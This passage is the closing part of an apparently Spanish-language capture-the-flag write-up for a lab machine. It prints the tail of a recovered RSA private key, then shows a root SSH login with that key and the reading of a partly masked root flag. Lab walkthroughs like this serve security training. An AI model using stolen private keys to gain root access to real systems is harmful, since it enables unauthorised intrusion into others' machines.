+XnGBS35kpKZB7j5dMZxxOwPDowgZr9aGNAzcFAeCaP5jj3DhAkEDb4p9D5gqgSOc
+NXdU4KxzvZeBQn3IUyDbJ0J4pniHZzrYq9c6MiT1Z9KHfMkYGozyMd16Qyx4/Isf
+bc51aYmHCQIgCMdb8cTpq+uOUyIK2JrgPNxrCGF8HNhw8qT9jCez3aMCIAjHW/HE
+6avrjlMiCtia4DzcawhhfBzYcPKk/Ywns92jAkEBZ7eXqfWhxUbK7HsKf9IkmRRi
+hxnHNiRzKhXgV4umYdzDsQ6dPPBnzzMWkB7SOE5rxabZzkAinHK3eZ3HsMsC8Q==
+-----END RSA PRIVATE KEY-----</span>
+</code></pre></div></div>
+
+<div><p>Con la id_rsa privada nos podemos conectar por ssh como root y leer la ultima flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">root@10.10.10.34 -i id_rsa
+[</span><span class="s2">root@localhost</span><span class="na"> ~</span><span class="p">]# id
+uid=0(root) gid=0(root) grupos=0(root)
+[</span><span class="s2">root@localhost </span><span class="na">~</span><span class="p">]# hostname -I
+10.10.10.34 dead:beef::5e6:97fd:5531:6b96 
+[</span><span class="s2">root@localhost </span><span class="na">~</span><span class="p">]# cat root.txt 
+f64**************************aa1
+[</span><span class="s2">root@localhost </span><span class="na">~</span><span class="p">]#</span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
